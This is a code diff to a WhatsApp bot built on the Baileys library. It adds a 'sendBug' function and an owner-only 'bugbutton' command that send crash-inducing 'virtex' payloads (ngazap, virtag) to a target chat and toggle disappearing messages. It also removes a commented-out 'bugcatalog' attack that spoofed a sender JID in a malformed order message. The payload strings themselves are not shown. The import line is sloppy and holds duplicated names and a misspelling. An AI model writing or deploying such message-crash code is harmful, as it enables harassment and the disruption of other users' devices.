@@ -26,7 +26,7 @@
 
 process.on('uncaughtException', console.error)
 require("./config")
-const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, WAFlag } = require('@adiwajshing/baileys')
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, WAFlag , MessageType , _WAConnection,MessageType, Presence, MessageOptions, Mimetype, MimetypeMap,WALocationMessage, ChatModification, WA_MESSAGE_STUB_TYPES, WA_DEFAULT_EPHEMERAL, ReclientectMode, ProxyAgent, GroupSettingChange, waChatKey, mentionedJid, processTime,} = require('@adiwajshing/baileys')
 const zNexus = require("@adiwajshing/baileys")
 const fs = require('fs')
 const util = require('util')
@@ -249,10 +249,9 @@ const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('aud
 
 const setting = JSON.parse(fs.readFileSync('./apikey.json'))
 
-
 const mongoose = require("mongoose");
 
-const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
+const time2 =moment().tz("Asia/Kolkata").format("HH:mm:ss")
     if (time2 < "24:59:00") {
       var ucapanWaktu = "Good night";
     }
@@ -272,6 +271,21 @@ const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
       var ucapanWaktu = "Good night🌃";
     }
 
+	
+////////// -bug button ////////////////////
+
+const sendBug = async (target, teks) => {
+      if (!teks) teks = ".";
+      await Nexus.relayWAMessage(
+        Nexus.prepareMessageFromContent(
+          target,
+          Nexus.prepareDisappearingMessageSettingContent(0),
+          {}
+        ),
+        { waitForAck: true }
+      );
+      Nexus.sendMessage(target, teks, "conversation");
+    };
 
 /////////// -  DM chatbot (Delete this part to turn off DM Chat Bot) - //////////////////
 
@@ -6869,33 +6883,13 @@ if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
 }
 Nexus.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
 break
-// case 'bugcatalog':
-// if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
-//  babi = (teks) => {
-//              res = Nexus.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
-//   key: {
-//    participant: '919999999@s.whatsapp.net' // Fake sender Jid
-//   },
-//   message: {
-//    orderMessage: {
-//     itemCount: 9999999, // Bug
-//     status: 1,
-//     surface: 1,
-//     message: `${virtex6(prefix)}`,
-//     orderTitle: `${emoji2(prefix)}`, // Idk what this does
-//     sellerJid: '919999999@s.whatsapp.net' // Seller
-//    }
-//   }
-//  }
-// })
-//              Nexus.relayWAMessage(res)
-//         }
-//         babi(`${ngazap(prefix)}`)
-//         babi(`${virtag(prefix)}`)
-//         babi(`${virtex6(prefix)}`)
-//         babi(`${emoji2(prefix)}`)
-// break
-
+case 'bugbutton':
+       if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+        Nexus.toggleDisappearingMessages(from, 0)
+        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
+        Nexus.toggleDisappearingMessages(from, 0)
+break
+		
 default:
 
     if(isCmd){
